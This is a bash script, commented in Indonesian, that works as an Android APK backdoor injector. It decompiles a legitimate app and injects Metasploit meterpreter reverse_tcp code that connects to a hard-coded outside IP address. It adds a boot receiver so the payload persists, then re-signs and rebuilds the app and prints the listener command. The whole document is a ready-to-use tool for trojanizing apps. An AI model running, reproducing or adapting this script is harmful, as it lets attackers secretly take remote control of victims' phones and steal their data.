#!/bin/bash

# =============================================
# APK BACKDOOR INJECTOR - FIXED VERSION
# =============================================

# --- KONFIGURASI ---
APK_INPUT="${1:-original.apk}"
LHOST="8.215.192.205"
LPORT="4444"
WORKDIR=$(mktemp -d -p "$(pwd)" apk_work_XXXXXX)
TOOL_DIR="$HOME/.apk_tools"
LOG_FILE="apk_mod_$(date +%Y%m%d_%H%M%S).log"
KEYSTORE="$TOOL_DIR/debug.keystore"
APK_OUTPUT="${APK_INPUT%.*}_injected.apk"

# --- FUNGSI PERBAIKAN ---

install_aapt() {
    echo "[*] Menginstall aapt..." | tee -a "$LOG_FILE"
    sudo apt-get install -y aapt aapt2 android-framework-res >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal menginstall aapt" | tee -a "$LOG_FILE"
        exit 1
    }
}

fix_apktool() {
    echo "[*] Memperbaiki framework apktool..." | tee -a "$LOG_FILE"
    apktool empty-framework-dir --force >> "$LOG_FILE" 2>&1
    apktool if /usr/share/android-framework-res/framework-res.apk >> "$LOG_FILE" 2>&1
}

setup_keystore() {
    echo "[*] Membuat keystore..." | tee -a "$LOG_FILE"
    mkdir -p "$TOOL_DIR"
    
    keytool -genkey -v -keystore "$KEYSTORE" \
    -alias androiddebugkey -storepass android -keypass android \
    -keyalg RSA -keysize 4096 -validity 10000 \
    -dname "CN=Android Debug,O=Android,C=US" >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal membuat keystore" | tee -a "$LOG_FILE"
        exit 1
    }
}

handle_complex_apk() {
    echo "[*] Menangani APK kompleks..." | tee -a "$LOG_FILE"
    
    # 1. Hapus signature lama
    zip -d "$APK_INPUT" 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*.DSA' >> "$LOG_FILE" 2>&1
    
    # 2. Dekompilasi tanpa resource
    apktool d -r -s -f "$APK_INPUT" -o "$WORKDIR/original" >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal mendekompilasi APK" | tee -a "$LOG_FILE"
        exit 1
    }
}

build_repaired_apk() {
    echo "[*] Membangun APK (metode perbaikan)..." | tee -a "$LOG_FILE"
    
    # 1. Build tanpa kompresi resource
    apktool b --use-aapt2 "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 || {
        echo "[!] Gagal build dengan aapt2, mencoba metode alternatif..." | tee -a "$LOG_FILE"
        
        # Fallback: Build dengan opsi minimal
        apktool b --use-aapt2 -c "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 || {
            echo "[X] Gagal membangun APK" | tee -a "$LOG_FILE"
            exit 1
        }
    }
    
    # 2. Signing dengan verifikasi
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
    -keystore "$KEYSTORE" -storepass android -keypass android \
    "$WORKDIR/unsigned.apk" androiddebugkey >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal menandatangani APK" | tee -a "$LOG_FILE"
        exit 1
    }
    
    # 3. Zipalign dengan cek integritas
    zipalign -c -v 4 "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 && \
    zipalign -f -v 4 "$WORKDIR/unsigned.apk" "$APK_OUTPUT" >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal melakukan zipalign" | tee -a "$LOG_FILE"
        exit 1
    }
}

# --- EKSEKUSI UTAMA ---
echo "=== APK INJECTOR DIPERBAIKI ===" | tee -a "$LOG_FILE"
echo "[*] LHOST: $LHOST" | tee -a "$LOG_FILE"
echo "[*] LPORT: $LPORT" | tee -a "$LOG_FILE"

# Langkah perbaikan
install_aapt
fix_apktool
setup_keystore

# Proses modifikasi
handle_complex_apk

# Inject payload (sama seperti sebelumnya)
echo "[*] Menyuntikkan payload..." | tee -a "$LOG_FILE"
msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
-o "$WORKDIR/payload.apk" >> "$LOG_FILE" 2>&1 || {
    echo "[X] Gagal membuat payload" | tee -a "$LOG_FILE"
    exit 1
}

apktool d -f "$WORKDIR/payload.apk" -o "$WORKDIR/payload" >> "$LOG_FILE" 2>&1
cp -r "$WORKDIR/payload/smali/com/metasploit" "$WORKDIR/original/smali/com/" >> "$LOG_FILE" 2>&1

# Modifikasi Manifest
sed -i '/<application/i \
<uses-permission android:name="android.permission.INTERNET"/> \
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' \
"$WORKDIR/original/AndroidManifest.xml"

sed -i '/<\/application>/i \
<service android:name="com.metasploit.stage.PayloadService" \
    android:exported="false" \
    android:permission="android.permission.BIND_JOB_SERVICE"/> \
<receiver android:name="com.metasploit.stage.PayloadReceiver" \
    android:exported="false"> \
    <intent-filter> \
        <action android:name="android.intent.action.BOOT_COMPLETED"/> \
    </intent-filter> \
</receiver>' "$WORKDIR/original/AndroidManifest.xml"

# Build final
build_repaired_apk

echo "[+] Berhasil dibangun: $APK_OUTPUT" | tee -a "$LOG_FILE"
echo "[*] Listener command:" | tee -a "$LOG_FILE"
echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run'" | tee -a "$LOG_FILE"

# Bersihkan
rm -rf "$WORKDIR"
